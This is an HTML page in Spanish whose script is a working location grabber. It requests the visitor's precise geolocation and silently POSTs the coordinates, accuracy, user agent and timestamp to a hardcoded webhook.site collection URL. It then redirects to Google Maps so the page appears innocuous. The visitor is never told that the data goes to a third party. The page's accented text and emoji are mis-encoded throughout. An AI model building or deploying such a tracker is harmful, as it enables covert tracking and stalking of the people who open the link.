<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Ubicaci√≥n en tiempo real</title>
</head>
<body>
  <h2>üìç Obteniendo tu ubicaci√≥n‚Ä¶</h2>
  <pre id="msg">Esperando permisos‚Ä¶</pre>

  <script>
    const REPORT_URL = "https://webhook.site/1680fad7-4e5b-4842-a3b7-d76fcd7d5639"; // tu URL
    const msg = document.getElementById("msg");

    function sendLocation(lat, lon, acc) {
      const data = {
        latitude: lat,
        longitude: lon,
        accuracy: acc,
        googleMaps: `https://www.google.com/maps?q=${lat},${lon}`,
        ua: navigator.userAgent,
        time: new Date().toISOString()
      };

      msg.textContent = "‚úÖ Coordenadas obtenidas:\n" + JSON.stringify(data, null, 2);

      // Enviar datos a Webhook.site
      fetch(REPORT_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      })
      .then(() => {
        // Redirigir a Google Maps despu√©s de 2 segundos
        setTimeout(() => {
          window.location.href = data.googleMaps;
        }, 2000);
      })
      .catch(err => {
        console.error("Error enviando:", err);
        msg.textContent += "\n‚ùå Error enviando datos: " + err;
      });
    }

    function onError(err) {
      msg.textContent = "‚ö†Ô∏è Error al obtener ubicaci√≥n: " + (err.message || err.code);
    }

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        pos => sendLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy),
        onError,
        { enableHighAccuracy: true, timeout: 10000 }
      );
    } else {
      msg.textContent = "‚ùå Geolocalizaci√≥n no soportada en este navegador.";
    }
  </script>
</body>
</html>

